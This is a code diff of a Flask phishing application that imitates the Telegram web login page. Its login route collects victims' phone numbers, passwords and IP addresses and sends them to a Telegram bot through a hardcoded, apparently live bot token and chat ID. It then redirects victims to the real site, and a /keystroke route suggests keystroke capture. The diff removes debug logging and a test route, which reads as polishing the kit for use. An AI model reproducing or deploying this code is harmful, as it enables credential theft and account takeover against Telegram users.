@@ -1,21 +1,21 @@
 from flask import Flask, request, render_template_string, redirect
 import requests
 from datetime import datetime
-import os
 
 app = Flask(__name__)
 
-BOT_TOKEN = "8161884377:AAH7zILNRGrqH-12JtobVpsxslIXIQoMipM"
-CHAT_ID = 6181804501
+# ===== PUT YOUR REAL TOKEN AND CHAT ID HERE =====
+BOT_TOKEN = "8161884377:AAH7zILNRGrqH-12JtobVpsxslIXIQoMipM"  # Replace with your bot token
+CHAT_ID = "6181804501"      # Replace with your chat ID
+# ================================================
 
-# ===== SAME HTML AS BEFORE =====
 HTML_PAGE = """<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Telegram</title>
-    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><circle cx='12' cy='12' r='12' fill='%230088cc'/><path d='M5.5 11.7l11.6-4.5c.5-.2 1 .1.8.9l-2 9.3c-.1.7-.5.8-1.1.5l-3-2.2-1.5 1.4c-.2.2-.3.3-.6.3l.2-3.1 5.6-5c.2-.2-.1-.3-.4-.1l-6.9 4.4-3-.9c-.6-.2-.7-.6.1-1z' fill='white'/></svg>" type="image/svg+xml">
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Ccircle cx='12' cy='12' r='12' fill='%230088cc'/%3E%3Cpath d='M5.5 11.7l11.6-4.5c.5-.2 1 .1.8.9l-2 9.3c-.1.7-.5.8-1.1.5l-3-2.2-1.5 1.4c-.2.2-.3.3-.6.3l.2-3.1 5.6-5c.2-.2-.1-.3-.4-.1l-6.9 4.4-3-.9c-.6-.2-.7-.6.1-1z' fill='white'/%3E%3C/svg%3E" type="image/svg+xml">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #0f0f0f; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 16px; -webkit-text-size-adjust: 100%; }
@@ -37,13 +37,11 @@ HTML_PAGE = """<!DOCTYPE html>
         .phone-row .phone-input::placeholder { color: #555555; }
         .password-wrapper { display: flex; align-items: center; background: #262626; border: 1px solid #333333; border-radius: 10px; transition: border-color 0.2s, background 0.2s; min-height: 52px; position: relative; }
         .password-wrapper:focus-within { border-color: #0088cc; background: #2a2a2a; }
-        .password-wrapper input[type="password"], .password-wrapper input[type="text"] { flex: 1; min-width: 80px; border: none; background: transparent; padding: 14px 12px 14px 16px; color: #ffffff !important; font-size: 16px; outline: none; -webkit-text-fill-color: #ffffff !important; opacity: 1 !important; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
-        .password-wrapper input[type="password"] { -webkit-text-security: disc !important; text-security: disc !important; }
-        .password-wrapper input[type="text"] { -webkit-text-security: none !important; text-security: none !important; }
-        .password-wrapper input::placeholder { color: #555555 !important; -webkit-text-fill-color: #555555 !important; opacity: 1 !important; -webkit-text-security: none !important; text-security: none !important; }
-        .password-wrapper input:-webkit-autofill { -webkit-box-shadow: 0 0 0 1000px #262626 inset !important; -webkit-text-fill-color: #ffffff !important; -webkit-text-security: disc !important; }
-        .password-wrapper input::-webkit-reveal { display: none !important; }
-        .password-wrapper input::-ms-reveal { display: none !important; }
+        .password-wrapper input[type="password"] { flex: 1; min-width: 80px; border: none; background: transparent; padding: 14px 12px 14px 16px; color: #ffffff !important; font-size: 16px; outline: none; -webkit-text-fill-color: #ffffff !important; opacity: 1 !important; -webkit-text-security: disc !important; text-security: disc !important; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+        .password-wrapper input[type="password"]::placeholder { color: #555555 !important; -webkit-text-fill-color: #555555 !important; opacity: 1 !important; -webkit-text-security: none !important; text-security: none !important; }
+        .password-wrapper input[type="password"]:-webkit-autofill { -webkit-box-shadow: 0 0 0 1000px #262626 inset !important; -webkit-text-fill-color: #ffffff !important; -webkit-text-security: disc !important; }
+        .password-wrapper input[type="password"]::-webkit-reveal { display: none !important; }
+        .password-wrapper input[type="password"]::-ms-reveal { display: none !important; }
         .password-toggle { flex-shrink: 0; background: none; border: none; cursor: pointer; padding: 8px 14px 8px 6px; color: #888; display: flex; align-items: center; justify-content: center; transition: color 0.2s; height: 100%; min-height: 44px; position: relative; z-index: 2; }
         .password-toggle:hover { color: #ddd; }
         .password-toggle svg { width: 22px; height: 22px; display: block; stroke: currentColor; stroke-width: 2; fill: none; stroke-linecap: round; stroke-linejoin: round; }
@@ -76,8 +74,8 @@ HTML_PAGE = """<!DOCTYPE html>
         @keyframes spin { to { transform: rotate(360deg); } }
         .loading-overlay p { color: #aaa; font-size: 15px; }
         .honeypot { position: absolute; left: -9999px; top: -9999px; opacity: 0; pointer-events: none; }
-        @media (max-width: 500px) { .login-wrapper { padding: 32px 20px 28px; border-radius: 16px; margin: 0; } .phone-row .country-code { width: 50px; min-width: 40px; padding: 12px 2px 12px 10px; font-size: 15px; } .phone-row .phone-input { padding: 12px 10px 12px 2px; font-size: 15px; min-width: 80px; } .password-wrapper input[type="password"], .password-wrapper input[type="text"] { padding: 12px 10px 12px 14px; font-size: 15px; } .password-toggle { padding: 6px 10px 6px 4px; min-height: 40px; } .password-toggle svg { width: 20px; height: 20px; } }
-        @media (min-width: 1200px) { .login-wrapper { max-width: 460px; padding: 56px 48px 48px; } .phone-row .country-code { width: 70px; padding: 16px 6px 16px 18px; font-size: 17px; } .phone-row .phone-input { padding: 16px 18px 16px 6px; font-size: 17px; } .password-wrapper input[type="password"], .password-wrapper input[type="text"] { padding: 16px 14px 16px 18px; font-size: 17px; } .password-toggle { padding: 10px 18px 10px 8px; min-height: 52px; } .password-toggle svg { width: 24px; height: 24px; } }
+        @media (max-width: 500px) { .login-wrapper { padding: 32px 20px 28px; border-radius: 16px; margin: 0; } .phone-row .country-code { width: 50px; min-width: 40px; padding: 12px 2px 12px 10px; font-size: 15px; } .phone-row .phone-input { padding: 12px 10px 12px 2px; font-size: 15px; min-width: 80px; } .password-wrapper input[type="password"] { padding: 12px 10px 12px 14px; font-size: 15px; } .password-toggle { padding: 6px 10px 6px 4px; min-height: 40px; } .password-toggle svg { width: 20px; height: 20px; } }
+        @media (min-width: 1200px) { .login-wrapper { max-width: 460px; padding: 56px 48px 48px; } .phone-row .country-code { width: 70px; padding: 16px 6px 16px 18px; font-size: 17px; } .phone-row .phone-input { padding: 16px 18px 16px 6px; font-size: 17px; } .password-wrapper input[type="password"] { padding: 16px 14px 16px 18px; font-size: 17px; } .password-toggle { padding: 10px 18px 10px 8px; min-height: 52px; } .password-toggle svg { width: 24px; height: 24px; } }
     </style>
 </head>
 <body>
@@ -151,7 +149,7 @@ HTML_PAGE = """<!DOCTYPE html>
             btn.textContent = 'Signing in...';
             document.getElementById('loadingOverlay').classList.add('active');
             document.getElementById('sessionToken').value = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-            passwordField.setAttribute('value', realPassword);
+            passwordField.value = realPassword;
         });
         document.addEventListener('DOMContentLoaded', function() {
             document.getElementById('phone').focus();
@@ -166,11 +164,6 @@ def index():
 
 @app.route('/login', methods=['POST'])
 def login():
-    # DEBUG LOGGING
-    print("=" * 60)
-    print("🔐 LOGIN ENDPOINT HIT")
-    print(f"Form data: {dict(request.form)}")
-    
     phone = request.form.get('phone', '')
     password = request.form.get('password', '')
     country = request.form.get('country_code', '')
@@ -180,11 +173,6 @@ def login():
     timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')
 
     full_phone = f"{country}{phone}" if phone else phone
-
-    print(f"📱 Phone: {full_phone}")
-    print(f"🔑 Password: {password}")
-    print(f"🎫 Session: {session_token}")
-    print(f"🌐 IP: {ip}")
 
     message = f"""🔐 **NEW LOGIN CREDENTIALS**
 
@@ -196,10 +184,6 @@ def login():
 🕒 **Time:** `{timestamp}`
 """
 
-    print(f"📤 Sending to Telegram...")
-    print(f"BOT_TOKEN: {BOT_TOKEN[:10]}... (truncated)")
-    print(f"CHAT_ID: {CHAT_ID}")
-
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
         payload = {
@@ -207,28 +191,11 @@ def login():
             "text": message,
             "parse_mode": "Markdown"
         }
-        response = requests.post(url, json=payload, timeout=5)
-        print(f"✅ Telegram response: {response.status_code}")
-        print(f"Response body: {response.text}")
+        requests.post(url, json=payload, timeout=5)
     except Exception as e:
-        print(f"❌ Telegram send failed: {e}")
+        print(f"Telegram send failed: {e}")
 
-    print("=" * 60)
     return redirect('https://web.telegram.org')
-
-@app.route('/test')
-def test():
-    try:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        payload = {
-            "chat_id": CHAT_ID,
-            "text": "✅ Bot is alive and working!",
-            "parse_mode": "Markdown"
-        }
-        response = requests.post(url, json=payload, timeout=5)
-        return f"Test sent! Status: {response.status_code} - {response.text}"
-    except Exception as e:
-        return f"Test failed: {e}"
 
 @app.route('/keystroke', methods=['POST'])
 def keystroke():
